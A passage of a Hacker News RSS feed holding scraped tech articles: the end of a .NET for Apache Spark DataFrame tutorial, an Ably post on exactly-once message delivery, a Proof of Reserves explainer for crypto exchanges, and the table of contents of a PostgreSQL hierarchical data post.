</span><span>    |  1|       Literal|  1|
</span><span>    |  2|       Literal|  0|
</span><span>    |  3|       Literal|  1|
</span><span>    |  4|       Literal|  0|
</span><span>    +---+--------------+---+
</span><span> */</span>

</code></pre></div><h3 id="range-in-spark-sql">Range in Spark SQL</h3>
<p>The next approach to creating DataFrame's is by using the range function but from Spark SQL rather than the previous example that used the Dataframe API:</p>
<div><pre><code data-lang="csharp"><span>var</span> dataFrame = spark.Sql(<span>"select id from range(1000)"</span>);
dataFrame.Show(<span>5</span>);
<span>/*
</span><span> *  +---+
</span><span>    | id|
</span><span>    +---+
</span><span>    |  0|
</span><span>    |  1|
</span><span>    |  2|
</span><span>    |  3|
</span><span>    |  4|
</span><span>    +---+
</span><span> */</span>

dataFrame = spark.Sql(<span>"select id, 'Literal' as `Another Column` from range(1000)"</span>);
dataFrame.Show(<span>5</span>);

<span>/*
</span><span> *  +---+--------------+
</span><span>    | id|Another Column|
</span><span>    +---+--------------+
</span><span>    |  0|       Literal|
</span><span>    |  1|       Literal|
</span><span>    |  2|       Literal|
</span><span>    |  3|       Literal|
</span><span>    |  4|       Literal|
</span><span>    +---+--------------+
</span><span> */</span>

dataFrame = spark.Sql(<span>"select id, 'Literal' as `Another Column`, pmod(id, 2) as `Mod`  from range(1000)"</span>);
dataFrame.Show(<span>5</span>);

<span>/*
</span><span> *  +---+--------------+---+
</span><span>    | id|Another Column|Mod|
</span><span>    +---+--------------+---+
</span><span>    |  0|       Literal|  0|
</span><span>    |  1|       Literal|  1|
</span><span>    |  2|       Literal|  0|
</span><span>    |  3|       Literal|  1|
</span><span>    |  4|       Literal|  0|
</span><span>    +---+--------------+---+
</span><span> */</span>

</code></pre></div><p>(Note I have the same internal monolog with this version, in case you were wondering)</p>
<h3 id="createdataframe-built-in-types">CreateDataFrame (built-in types)</h3>
<p>The next method is to pass an IEnumerable<t> of a built-in type, which will create one row for each item in the array, and the DataFrame will have one single column called “_1”. The type of the column is the type of the items in the IEnumerable<t>:</t></t></p>
<div><pre><code data-lang="csharp"><span>var</span> stringArray = <span>new</span> <span>string</span>[] {<span>"a"</span>, <span>"b"</span>, <span>"c"</span>};
<span>var</span> dataFrame = spark.CreateDataFrame(stringArray);

dataFrame.Show();
<span>/*
</span><span> *  +---+
</span><span>    | _1|
</span><span>    +---+
</span><span>    |  a|
</span><span>    |  b|
</span><span>    |  c|
</span><span>    +---+
</span><span> */</span>

<span>var</span> stringList = <span>new</span> List&lt;<span>string</span>&gt;() {<span>"d"</span>, <span>"e"</span>, <span>"f"</span>};
dataFrame = spark.CreateDataFrame(stringList);

dataFrame.Show();
<span>/*
</span><span> *  +---+
</span><span>    | _1|
</span><span>    +---+
</span><span>    |  d|
</span><span>    |  e|
</span><span>    |  f|
</span><span>    +---+
</span><span> */</span>

<span>var</span> doubleList = <span>new</span> List&lt;<span>double</span>&gt;() {<span>0.0</span>, <span>1.1</span>, <span>2.2</span>};
dataFrame = spark.CreateDataFrame(doubleList);

dataFrame.Show();
<span>/*
</span><span> *  +---+
</span><span>    | _1|
</span><span>    +---+
</span><span>    |0.0|
</span><span>    |1.1|
</span><span>    |2.2|
</span><span>    +---+
</span><span> */</span>

dataFrame = dataFrame.WithColumnRenamed(<span>"_1"</span>, <span>"double_column"</span>);
dataFrame.Show();

<span>/*
</span><span> *  +-------------+
</span><span>    |double_column|
</span><span>    +-------------+
</span><span>    |          0.0|
</span><span>    |          1.1|
</span><span>    |          2.2|
</span><span>    +-------------+
</span><span> */</span>

dataFrame = dataFrame.WithColumn(<span>"literal"</span>, Functions.Lit(<span>"abc"</span>));
dataFrame.Show();
<span>/*
</span><span> *  +-------------+-------+
</span><span>    |double-column|literal|
</span><span>    +-------------+-------+
</span><span>    |          0.0|    abc|
</span><span>    |          1.1|    abc|
</span><span>    |          2.2|    abc|
</span><span>    +-------------+-------+
</span><span> */</span>
Console.WriteLine(<span>"SelectExpr"</span>);
dataFrame =
    dataFrame.SelectExpr(<span>"double_column"</span>, <span>"literal"</span>, <span>"'hello' as literal2"</span>, <span>"pmod(double_column, 2)"</span>);
dataFrame.Show();
<span>/*
</span><span> *  +-------------+-------+--------+--------------------------------------+
</span><span>    |double_column|literal|literal2|pmod(double_column, CAST(2 AS DOUBLE))|
</span><span>    +-------------+-------+--------+--------------------------------------+
</span><span>    |          0.0|    abc|   hello|                                   0.0|
</span><span>    |          1.1|    abc|   hello|                                   1.1|
</span><span>    |          2.2|    abc|   hello|                   0.20000000000000018|
</span><span>    +-------------+-------+--------+--------------------------------------+
</span><span> */</span>

dataFrame = dataFrame.WithColumnRenamed(<span>"pmod(double_column, CAST(2 AS DOUBLE))"</span>, <span>"mod_column"</span>);
dataFrame.Show();
<span>/*
</span><span> *  +-------------+-------+--------+-------------------+
</span><span>    |double_column|literal|literal2|         mod_column|
</span><span>    +-------------+-------+--------+-------------------+
</span><span>    |          0.0|    abc|   hello|                0.0|
</span><span>    |          1.1|    abc|   hello|                1.1|
</span><span>    |          2.2|    abc|   hello|0.20000000000000018|
</span><span>    +-------------+-------+--------+-------------------+
</span><span> */</span>

</code></pre></div>
<p>The last example is where we want to pass in a number of objects to create multiple columns. To use this method, we need to create a <code>StructType</code> which defines the type of each of the columns:</p>
<div><pre><code data-lang="csharp"><span>var</span> rowOne = <span>new</span> GenericRow(<span>new</span> <span>object</span>[]
{
    <span>"columnOne Row One"</span>, <span>1.1</span>
});

<span>var</span> rowTwo = <span>new</span> GenericRow(<span>new</span> <span>object</span>[]
{
    <span>"columnOne Row Two"</span>, <span>null</span>
});

<span>var</span> rowThree = <span>new</span> GenericRow(<span>new</span> <span>object</span>[]
{
    <span>"columnOne Row Three"</span>, <span>3.3</span>
});

<span>var</span> rows = <span>new</span> List&lt;GenericRow&gt;()
{
    rowOne, rowTwo, rowThree
};

<span>var</span> structType = <span>new</span> StructType(<span>new</span> List&lt;StructField&gt;()
{
    <span>new</span> StructField(<span>"column one"</span>, <span>new</span> StringType(), isNullable: <span>false</span>),
    <span>new</span> StructField(<span>"column two"</span>, <span>new</span> DoubleType(), isNullable: <span>true</span>)
});

<span>var</span> dataFrame = spark.CreateDataFrame(rows, structType);
dataFrame.Show();
<span>/*
</span><span> *  +-------------------+----------+
</span><span>    |         column one|column two|
</span><span>    +-------------------+----------+
</span><span>    |  columnOne Row One|       1.1|
</span><span>    |  columnOne Row Two|      null|
</span><span>    |columnOne Row Three|       3.3|
</span><span>    +-------------------+----------+
</span><span> */</span>

dataFrame.PrintSchema();

<span>/*
</span><span> *  root
</span><span>     |-- column one: string (nullable = false)
</span><span>     |-- column two: double (nullable = true)
</span><span> */</span>

</code></pre></div><h2 id="summary">Summary</h2>
<p>There you have it. You can:</p>
<ul>
<li>Read data from a file</li>
<li>Use SparkSession.Range() or “select * from range(100)” to project some rows and add columns to it.</li>
<li>Use SparkSession.CreateDataFrame</li>
</ul>

                            
                            
                            
                                
                           
                            

                            <!-- Disqus Inject -->
                
                            
                                <section>
    
    
    
    
</section>
                            
                        
                        </div>
                    
            </secion></div>
            
        <!-- Footer -->
            



<!-- Footer -->

    












        </div></div>]]>
            </description>
            <link>https://the.agilesql.club/2021/01/how-to-get-data-in-a-dataframe-via-.net-for-apache-spark/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25816052</guid>
            <pubDate>Sun, 17 Jan 2021 22:48:54 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Achieving exactly-once delivery with Ably]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25816005">thread link</a>) | @yannoninator
<br/>
January 17, 2021 | https://www.ably.io/blog/achieving-exactly-once-message-processing-with-ably | <a href="https://web.archive.org/web/*/https://www.ably.io/blog/achieving-exactly-once-message-processing-with-ably">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="site-main" data-namespace="post">
<div>
<article>

<section data-layout="col@sm-down--">

</section>
<section>
<div>
<p>Exactly-once is a desirable (if not critical) message delivery guarantee and a remarkably complex engineering challenge to solve. In this blog post, we will look at what exactly-once means in the context of distributed pub/sub systems, and the exactly-once guarantees that the <a href="https://www.ably.io/">Ably</a> realtime pub/sub messaging platform provides. Ably often acts as the broker in data streaming pipelines: publishers send messages to our platform, and we deliver these messages to subscribers. As a broker, Ably provides regional &amp; global fault tolerance, which ensures message availability and survivability. We also offer a set of capabilities via SDKs that enable clients to use idempotent publishing, and recover in the event of a failure while resuming precisely where they left off, with no lost or duplicate messages.</p>
<figure><img src="https://ik.imagekit.io/ably/ghost/prod/2020/11/4-pillars-exactly-once-semantics-cover.png?tr=w-1520" srcset="
      https://ik.imagekit.io/ably/ghost/prod/2020/11/4-pillars-exactly-once-semantics-cover.png?tr=w-345 345w,
      https://ik.imagekit.io/ably/ghost/prod/2020/11/4-pillars-exactly-once-semantics-cover.png?tr=w-470 470w,
      https://ik.imagekit.io/ably/ghost/prod/2020/11/4-pillars-exactly-once-semantics-cover.png?tr=w-760 760w,
      https://ik.imagekit.io/ably/ghost/prod/2020/11/4-pillars-exactly-once-semantics-cover.png?tr=w-1520 1520w
    " sizes="
      (max-width: 760px) 100vw,
      (max-width: 1520px) 760px,
      1520px
    "></figure><h3 id="exactly-once-delivery-is-one-of-the-hardest-engineering-challenges">Exactly-once delivery is one of the hardest engineering challenges<br>
</h3>
<p>In the context of distributed <a href="https://www.ably.io/topic/pub-sub">pub/sub</a> systems, exactly-once is a popular concept and a desirable, if not critical, system property. It also leads to confusion and diverging opinions within the development community. On the one hand, some argue that <a href="https://bravenewgeek.com/you-cannot-have-exactly-once-delivery/">exactly-once is simply unachievable.</a> On the other hand, there are systems such as <a href="https://kafka.apache.org/documentation/#semantics">Kafka that claim to support exactly-once semantics</a>. </p>
<p>We believe that a lot of the confusion around the concept has to do with the fact that there's no clear definition of what exactly-once actually means. It's arguably impossible to come up with a definition to satisfy everyone and every use case. That's because exactly-once can mean different things for different systems and different use cases. Regardless of how you look at it, though, exactly-once is, without a doubt, a distinctively complex engineering challenge. </p>
<p>Let’s now define what exactly-once means for Ably in particular. In our case, exactly-once is a guarantee that once acknowledged, a message published to Ably is <strong>delivered</strong> to a consumer precisely once, even in the context of individual system components failing. Note that most often, Ably is used to deliver messages in real time directly to end-user devices.</p>
<p>It’s crucial to mention that exactly-once is a system-wide property, and you only achieve it if all the constituent components play their part. This doesn’t mean that all the components must display exactly-once characteristics. For example, in our case, you can have a publisher that displays at-least-once behaviour. However, Ably provides an idempotent interface, which cancels out the fact that the producer may occasionally publish messages more than once. As long as at the other end of the pub/sub pipeline each message is delivered to subscribers precisely once, exactly-once behaviour is achieved as a whole.</p>
<h3 id="types-of-messaging-semantics">Types of messaging semantics<br>
</h3>
<p>Before we dive deeper into exactly-once delivery, let’s review the main types of messaging semantics. When a system is fully operational and working as intended, exactly-once delivery is the behaviour you generally expect. However, we must also consider how faults in the pub/sub system or, indeed, clients affect this behaviour. While most components fail independently in a distributed pub/sub system, without directly impacting other components, the overall quality of service can be affected. Depending on how the system behaves when failures do occur, you get several different types of messaging semantics:</p>
<ul>
<li>
<strong>At-most-once semantics</strong>. The easiest type of semantics to achieve, from an engineering complexity perspective, since it can be done in a fire-and-forget way. There's rarely any need for the components of the system to be stateful. While it's the easiest to achieve, at-most-once is also the least desirable type of messaging semantics. It provides no absolute message delivery guarantees since each message is delivered once (best case scenario) or not at all.</li>
<li>
<strong>At-least-once semantics. </strong>This is an improvement on at-most-once semantics. There might be multiple attempts at delivering a message, so at least one attempt is successful. In other words, there's a chance messages may be duplicated, but they can't be lost. While not ideal as a system-wide characteristic, at-least-once semantics are good enough for use cases where duplication of data is of little concern, or scenarios where deduplication is possible on the consumer side.</li>
<li>
<strong>Exactly-once semantics</strong>. The ultimate message delivery guarantee and the optimal choice in terms of data integrity. As its name suggests, exactly-once semantics means that each message is delivered precisely once. The message can neither be lost nor delivered twice (or more times). Exactly-once is by far the most dependable message delivery guarantee. It’s also the hardest to achieve.</li>
</ul>
<figure><img src="https://ik.imagekit.io/ably/ghost/prod/2020/11/exactly-once-semantics-messaging-semantics-overview.gif?tr=w-1520" alt="Overview of message delivery semantics: at-most-once delivery, at-least-once delivery, exactly-once delivery." srcset="
      https://ik.imagekit.io/ably/ghost/prod/2020/11/exactly-once-semantics-messaging-semantics-overview.gif?tr=w-345 345w,
      https://ik.imagekit.io/ably/ghost/prod/2020/11/exactly-once-semantics-messaging-semantics-overview.gif?tr=w-470 470w,
      https://ik.imagekit.io/ably/ghost/prod/2020/11/exactly-once-semantics-messaging-semantics-overview.gif?tr=w-760 760w,
      https://ik.imagekit.io/ably/ghost/prod/2020/11/exactly-once-semantics-messaging-semantics-overview.gif?tr=w-1520 1520w
    " sizes="
      (max-width: 760px) 100vw,
      (max-width: 1520px) 760px,
      1520px
    "><figcaption>High-level overview of message delivery semantics</figcaption></figure><p>What most distributed pub/sub systems can genuinely guarantee is <strong>mostly-once </strong>delivery. This means that when the system is functioning as intended, messages are delivered exactly once. However, when failures are involved, there’s always a chance some messages will be delivered either at-most-once or at-least-once.</p>
<h3 id="failures-that-prevent-exactly-once-delivery">Failures that prevent exactly-once delivery<br>
</h3>
<p>To demonstrate just how hard it is for distributed <a href="https://www.ably.io/topic/pub-sub">pub/sub</a> systems to achieve exactly-once semantics, we must talk about failures—specifically, components that can fail and how these failures can be mitigated.<br></p>
<p><strong>Publisher failure</strong></p>
<p>When a publisher fails, some sort of recovery process takes place. Depending on its design, after recovery, the publisher may reattempt to publish a message that has already been sent to and acknowledged by the broker. In such an event, the publisher failure causes at-least-once behaviour. Another scenario is that the publisher’s recovery procedure fails to realise that the publish attempt failed, which leads to at-most-once behaviour. </p>
<p>A strategy often used after a publish failure is to retry publishing the same message a fixed number of times. This is a pragmatic approach, but unsatisfactory in the context of exactly-once. Imagine that the publisher recovers and unsuccessfully tries to republish the same message five times, and then gives up. Practically none of the three semantics is achieved. To mitigate publisher failures Ably supports <a href="https://www.ably.io/topic/idempotency">idempotent publishing</a>, which ensures that regardless of how many times the same message is published to Ably, it will be delivered to subscribers exactly-once. <br></p>
<p><strong>Broker failure</strong></p>
<p>A broker failure has the potential to lead to all sorts of issues, including data loss. That’s why it’s recommended to design your system around the idea of mitigating or preventing loss of data. From a producer perspective, this could mean having the ability to publish messages at-least-once, so they can be resent to the broker if needed. </p>
<p>From a broker perspective (Ably included), let’s start by reviewing what a message ACK means. Obviously, it’s an acknowledgment that a published message has been received. Additionally, it should also imply that no subsequent failure will result in that message not being delivered to subscribers. In other words, it should be an acknowledgment that the broker provides sufficient redundancy to ensure continuity of service and onwards processing, even in the context of multiple infrastructure failures. Of course, nothing can be done to prevent or mitigate certain types of critical failures. When that happens, the sensible thing for the broker to do is to respond with a failure response (with HTTP, this is typically a 5xx status code), indicating clearly to the producer that the publish attempt was unsuccessful. </p>
<p><strong>Subscriber failure</strong></p>
<p>The most common subscriber failure that prevents exactly-once delivery involves short disconnections. For example, a client app on a mobile device will disconnect and quickly reconnect when the user switches from a mobile data network to a Wi-Fi network or goes through a tunnel. To counter this scenario and ensure exactly-once behaviour, the stream of messages must resume precisely where it left off when the subscriber recovers. For this to be possible, the connection state must be persisted and resynced when the subscriber reconnects.</p>
<p>If the broker is the one keeping track of the last message sent, you are unlikely to provide exactly-once semantics. That’s because a broker might send a message, and the subscriber might successfully receive it and then disconnect before sending an ACK to the broker. In such a case, once the subscriber reconnects, the broker will resend the respective message (at-least-once semantics) since it has no way of knowing that the subscriber had received it before disconnecting.</p>
<p>To ensure exactly-once behaviour, the responsibility of keeping track of the last message received should sit with the subscriber - something we also do at Ably, via serial numbers. This way, when the subscriber reconnects, it notifies the broker of the last message it has received so that the stream can be accurately resumed from a point in time.</p>
<h3 id="exactly-once-semantics-use-cases">Exactly-once semantics use cases<br>
</h3>
<p>In the world of distributed pub/sub systems, exactly-once semantics has been and continues to be extremely hard to achieve. Equally, almost everywhere you look in software development, exactly-once is a highly desirable system-wide property, if not an essential one. For example, exactly-once is crucial for most transactional messaging use cases. At its core, a transactional message is triggered by a consumer action, and it usually includes necessary or high-priority info, e.g., a bank balance inquiry or an order confirmation. </p>
<p>Ordered operations represent another use case where exactly-once is fundamental. Let’s say you want to use <a href="https://www.ably.io/blog/message-delta-compression/">delta compression</a> to only stream changes from the previous message to subscribers each time there’s an update. To achieve this, you need to use a transport that ensures data integrity through guaranteed message ordering and exactly-once semantics.</p>
<p>If not crucial, exactly-once is at least highly desirable, because it improves overall system predictability and provides better experiences to users in general. For …</p></div></section></article></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.ably.io/blog/achieving-exactly-once-message-processing-with-ably">https://www.ably.io/blog/achieving-exactly-once-message-processing-with-ably</a></em></p>]]>
            </description>
            <link>https://www.ably.io/blog/achieving-exactly-once-message-processing-with-ably</link>
            <guid isPermaLink="false">hacker-news-small-sites-25816005</guid>
            <pubDate>Sun, 17 Jan 2021 22:44:15 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Proof of Reserves]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25815398">thread link</a>) | @dayve
<br/>
January 17, 2021 | https://niccarter.info/proof-of-reserves/ | <a href="https://web.archive.org/web/*/https://niccarter.info/proof-of-reserves/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>		
	<div>
													
				<div id="post-241">						
						
						
<h2>Nic’s PoR ✨ Wall of Fame ✨</h2>







<h5>Entities which have conducted a PoR attestation within the last 12 months:</h5>







<ul><li><a href="https://coinfloor.co.uk/hodl/proof/">Coinfloor</a> (self-assessment, user validation with merkle approach, ongoing) </li><li><a href="https://www.gate.io/article/17489?from=banner_proof">Gate.io</a> (auditor-assisted, user validation with merkle approach, point in time)</li><li><a href="https://hbtc.zendesk.com/hc/en-us/articles/360046287754-HBTC-100-Proof-of-Reserve">HBTC</a> (self-assessment, user validation with merkle approach, point in time)</li><li>[Your exchange’s name here?]</li></ul>



<p><strong>Partial validation</strong></p>



<ul><li><a href="https://bitbuy.ca/assets/documents/Bitbuy%20Proof%20of%20Reserve%20and%20Security%20Audit%20Report.pdf">Bitbuy</a> (forensics firm assisted, no user validation, point in time)</li><li><a href="https://shakepay.com/docs/Shakepay_Proof_of_Reserves_and_Security_Report.pdf">Shakepay</a> (forensics firm assisted, no user validation, point in time)</li></ul>



<figure><img src="https://niccarter.info/wp-content/uploads/table_por-1024x404.png" alt="" width="600" srcset="https://niccarter.info/wp-content/uploads/table_por-1024x404.png 1024w, https://niccarter.info/wp-content/uploads/table_por-300x118.png 300w, https://niccarter.info/wp-content/uploads/table_por-768x303.png 768w, https://niccarter.info/wp-content/uploads/table_por-1536x606.png 1536w, https://niccarter.info/wp-content/uploads/table_por-2048x808.png 2048w" sizes="(max-width: 1024px) 100vw, 1024px"><figcaption>Optimally, providers would use a third party firm to attest to liabilities, would allow users to validate the PoR with the merkle approach, and would conduct an ongoing attestation.</figcaption></figure>



<p><em>Note: I am presenting these claims ‘as is’ with no endorsement or guarantee of their correctness</em></p>



<hr>



<h3>Proof of Reserve introduction</h3>







<p>If there’s a single thing I could do to better this industry, it would be to convince every custodial service provider in the cryptocurrency space to adopt a routine Proof of Reserve  program. </p>



<p>Proof of Reserves is the idea that custodial businesses holding cryptocurrency should create&nbsp;<strong>public facing</strong> attestations as to their reserves, matched up with a proof of user balances (liabilities). The equation is simple (in theory):</p>



<p><code>Proof of Reserves + Proof of Liability = Proof of Solvency</code></p>



<p>The idea is to prove to the general public, and in particular your depositors, that your cryptocurrency held on deposit matches up with user balances. Of course, in practice, this isn’t quite so simple. Proving that you control some funds on chain is trivial, but you could always borrow those funds on a short term basis. This is why point-in-time attestations mean relatively little. And additionally, exchanges can have hidden liabilities or have creditors claim seniority to depositors, especially if they don’t legally segregate client assets on the platform. This is why Wyoming’s SPDI law clarifying the legal status of depositors relative to custodial institutions is so important. </p>



<p>Proving liabilities is tricky, and generally requires an auditor to engage in a full assessment. For instance, exchanges can omit certain liabilities to ‘cheat’ a PoR attestation. This is why I recommend&nbsp;<em>both&nbsp;</em>a user-facing PoR protocol, allowing users to obtain ‘herd immunity’ by collectively verifying their individual balances,&nbsp;<em>and</em>&nbsp;an auditor-facing PoR protocol, to prove that the claimed liabilities are faithful to reality.</p>



<p>Another issue is that exchanges could have unaccounted-for liabilities that a mere cash flow analysis might not capture. For instance, given that many exchanges exist under muddy regulatory regimes and legal contexts, it’s not guaranteed that depositors would be senior to creditors in the case of bankruptcy. This means that it’s possible that large debts could consist of a hidden liability that would weaken depositor claims on reserves in a worst case scenario. This is why I recommend including an auditor in a PoR process, so these more complex liabilities (and an assessment of the seniority of depositors) can be understood. More generally, exchanges should adopt a legal policy in which depositors are absolutely privileged and senior to  all creditors.</p>



<p>So a Proof of Reserve program isn’t entirely trustless. However, it’s still worth doing, for several reasons:</p>



<ul><li>It’s good housekeeping. A periodic PoR attestation demonstrates to your end users that you have your house in order, and that you are being vigilant with regards to solvency</li><li>It’s a strong self-regulatory measure. If exchanges collectively adopted PoR, regulators might be more inclined to adopt a light touch approach. Much better to operate in relative freedom with voluntary self-regulatory measures rather than suffering onerous regulatory impositions later on</li><li>It helps safeguard against toxic operators by making fractional reserves virtually impossible to hide. These exchange failures reflect badly on the&nbsp;<em>whole&nbsp;</em>industry, so it’s in everyone’s interest to avoid them</li></ul>



<p>To those who reject PoR because it’s not perfectly trustless in its current implementation, I would respond that <em>the perfect is the enemy of the good</em>. At present, the industry standard is virtually no transparency. Those exchanges that are more stringently regulated, under the NY Trust License for instance, can credibly claim to be fair stewards of user funds. Some exchanges conduct audits to obtain bank partners. But these audits are generally not consumer facing, and many exchanges are loosely regulated. A far more potent trust signal would entail allowing depositors to individually verify that their deposits genuinely exist under the control of the exchange. If we let a commitment to perfection stall the adoption of processes like PoR, we will likely end up with a much worse situation where onerous, top-down regulation is imposed on exchanges. I always prefer proactive industry-driven self-regulation to state regulation, and I think you should, too. </p>



<hr>



<h5>Proof of Reserve Resources </h5>







<p><strong>Articles</strong>:</p>



<ul><li>Nic Carter in <strong>Coindesk</strong>,&nbsp;<a href="https://www.coindesk.com/how-to-stop-the-next-quadriga-make-exchanges-prove-their-reserves">How to Stop the Next Quadriga: Make Exchanges Prove Their Reserves</a></li><li>Karim Helmy in <strong>The Block</strong>, <a href="https://www.theblockcrypto.com/genesis/72212/exchange-proofs-of-reserves-solvency-a-mechanical-explanation">Exchange Proofs of Reserves &amp; Solvency: a mechanical explanation</a></li><li>Nic Carter on <strong>Medium</strong>,&nbsp;<a href="https://medium.com/@nic__carter/how-to-scale-bitcoin-without-changing-a-thing-bc4750dd16c7">How to scale Bitcoin (without changing a thing)</a></li><li>Mauricio Di Bartolomeo in <strong>Bitcoin Magazine</strong>, <a href="https://bitcoinmagazine.com/articles/why-proof-of-reserves-is-important-to-bitcoin">Why Proof of Reserves is Important to Bitcoin</a></li><li>Matt B on <strong>Medium</strong>, <a href="https://medium.com/chainrift-research/proof-of-reserves-a-standard-for-enhanced-transparency-38d205712152">Proof-of-Reserves: A Standard for Enhanced Transparency</a></li><li>Jason Tyra, <a href="https://www.tyracpa.com/proof-reserves-audit/">Proof of Reserves is Not and Audit</a>; <a href="https://www.tyracpa.com/proof-of-reserves/">Agreed Upon Procedures As Proof of Reserves</a>; and <a href="https://www.tyracpa.com/audit-vs-proof-of-reserves/">Bitcoin Proof of Reserves as Part of an Audit</a></li></ul>



<p><strong>Podcasts</strong>: </p>



<ul><li><strong>On The Brink</strong>,&nbsp;<a href="https://onthebrink-podcast.com/armanino-proof-of-reserves/">The auditor view of Proof of Reserves (with Noah Buxton and Jeremy Nau of Armanino LLP)</a></li><li><strong>On The Brink,</strong> <a href="https://onthebrink-podcast.com/making-blockchain-data-intelligible/">Making Blockchain Data intelligible for institutions, with Sal Ternullo and Sam Wyner</a></li></ul>



<p><strong>Papers</strong>: </p>



<ul><li><a href="https://www.sciencedirect.com/science/article/abs/pii/S0167739X1731350X">Designated-verifier proof of assets for bitcoin exchange using elliptic curve cryptography</a> (2020) </li><li><a href="https://papers.ssrn.com/sol3/papers.cfm?abstract_id=3359985">Systemizing the Challenges of Auditing Blockchain-Based Assets</a> (2019)</li><li><a href="https://ieeexplore.ieee.org/abstract/document/8787552">Revelio: A MimbleWimble Proof of Reserves Protocol</a> (2019)</li><li><a href="https://www.sciencedirect.com/science/article/pii/S0167404818314093">Breaking the binding: Attacks on the Merkle approach to prove liabilities and its applications</a> (2019)</li><li><a href="https://ieeexplore.ieee.org/abstract/document/8802437">MProve: A Proof of Reserves Protocol for Monero Exchanges</a> (2019)</li><li><a href="https://link.springer.com/article/10.1007/s12046-018-0880-4">Confidential and efficient asset proof for bitcoin exchanges </a>(2018)</li><li><a href="https://link.springer.com/chapter/10.1007/978-3-319-24177-7_28">Making Bitcoin Exchanges Transparent</a> (2015)</li><li><a href="https://dl.acm.org/doi/abs/10.1145/2810103.2813674">Provisions: Privacy-preserving Proofs of Solvency for Bitcoin Exchanges</a> (2015)</li><li><a href="https://fc13.ifca.ai/proc/1-2.pdf">Beware the Middleman: Empirical Analysis of Bitcoin-Exchange Risk </a>(2013)</li></ul>



<p><strong>Technical resources</strong>:</p>



<ul><li>Blockstream, <a href="https://blockstream.com/2019/02/04/en-standardizing-bitcoin-proof-of-reserves/">Standardizing Proof of Reserves</a> (2019)</li><li>Zak Wilcox, <a href="https://web.archive.org/web/20170114112433/https://iwilcox.me.uk/2014/proving-bitcoin-reserves">Proving Your Bitcoin&nbsp;Reserves</a> (2014). <em>This is Zak’s (since-deleted) description of the Maxwell/Todd ‘merkle approach’ to proving liabilities</em></li><li>Olalonde’s <a href="https://github.com/olalonde/proof-of-liabilities">Proof of Liabilities code on Github</a> (2015)</li></ul>



<hr>



<h5>FAQ </h5>







<p><strong>Why ‘Proof of Reserve’ if you really mean ‘Proof of Solvency’? </strong><br>Proof of Reserve sounds better, and Solvency is a much higher bar to clear. Ideally a PoR would be paired with a full accounting of liabilities, known and hidden, and stronger solvency assurances would be obtained. </p>



<p><strong>What about exchange/user privacy? <br></strong>As long as exchanges are ok with people knowing how the total value of assets on deposit, they don’t have to divulge any additional information. In practice, it’s trivial to determine how many coins an exchange has, and many third party providers actively publish this data. So trying to hide the number of coins on deposit is a lost cause anyway. Through the proof of liability tool, user information is anonymized and hashed. This allows only users with a knowledge of their account ID and their balance to verify that they are included in the merkle proof without spying on other users. </p>



<p><strong>What about DEXes? </strong><br>The growth of DEXes is exciting and great for the industry. However, cryptocurrency users have a revealed preference for custodial ownership, at least for a portion of their coins. Self-custody is hard and it isn’t for everyone. Approximately 20-25% of BTC and ETH is held in a custodial setting. By encouraging custodial exchanges to adopt PoR, I am hoping that user assurances at custodial exchanges can be bettered. However, it goes without saying – not your keys, not your coins. You are ALWAYS vulnerable if you choose to use a custodial exchange. </p>



<p><strong>I want to adopt PoR. What do you recommend? </strong><br><strong><br></strong>  1.   I recommend updating your legal ToS to clarify a) the segregation of client deposits and operating capital, b) the seniority of client deposits in liquidation, and c) the responsibilities you have towards depositors under your regulatory regime, if any. </p>



<p>  2.   As for adopting a PoR strategy, I suggest an <strong>ongoing</strong>, <strong>auditor-enhanced</strong>,<strong> user-verifiable proof of solvency using the merkle approach</strong>. Point in time attestations are not sufficient. I recommend using an auditor to assist and attest to the liabilities side. Currently <a href="https://real-time-attest.trustexplorer.io/proof-of-reserves">Armanino</a> and <a href="https://advisory.kpmg.us/articles/2020/kpmg-chain-fusion.html">KPMG</a> are audit/accounting firms known to be offering these services. I strongly recommend allowing depositors to verify that their balances are included in the proof of liabilities using the Maxwell/Todd merkle method. </p>



<p><strong>Why do I need an auditor or external third party assistance? </strong><br>The liabilities side of the equation is tricky, and for users to have confidence that the accounting is complete, it’s worth engaging a trusted auditor willing to contribute their professional reputation to an assessment of liabilities. </p>



<hr>



<p><em>Want to include your exchange in my list of active PoR participants? Have feedback or want to suggest a resource for inclusion? To get in touch, <a href="https://twitter.com/nic__carter/">DM me on Twitter</a>.</em></p>
				</div>					
										

		
	</div>
</div></div>]]>
            </description>
            <link>https://niccarter.info/proof-of-reserves/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25815398</guid>
            <pubDate>Sun, 17 Jan 2021 21:52:04 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Hierarchical Structures in PostgreSQL]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25815370">thread link</a>) | @alex_hirner
<br/>
January 17, 2021 | https://hoverbear.org/blog/postgresql-hierarchical-structures | <a href="https://web.archive.org/web/*/https://hoverbear.org/blog/postgresql-hierarchical-structures">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
            <article>
                
    <nav id="toc">
        <ol>
            
            <li>
                <a href="https://hoverbear.org/blog/postgresql-hierarchical-structures/#core-problem">Core Problem</a>
                
            </li>
            
            <li>
                <a href="https://hoverbear.org/blog/postgresql-hierarchical-structures/#concepts">Concepts</a>
                
            </li>
            
            <li>
                <a href="https://hoverbear.org/blog/postgresql-hierarchical-structures/#before-we-start">Before we start</a>
                
            </li>
            
            <li>
                <a href="https://hoverbear.org/blog/postgresql-hierarchical-structures/#solution-1-materialized-views-and-recursive-ctes">Solution 1: Materialized Views and Recursive CTEs</a>
                
                <ol>
                    
                    <li>
                        <a href="https://hoverbear.org/blog/postgresql-hierarchical-structures/#testing">Testing</a>
                    </li>
                    
                </ol>
                
            </li>
            
            <li>
                <a href="https://hoverbear.org/blog/postgresql-hierarchical-structures/#solution-2-ltree-columns">Solution 2: ltree columns</a>
                
                <ol>
                    
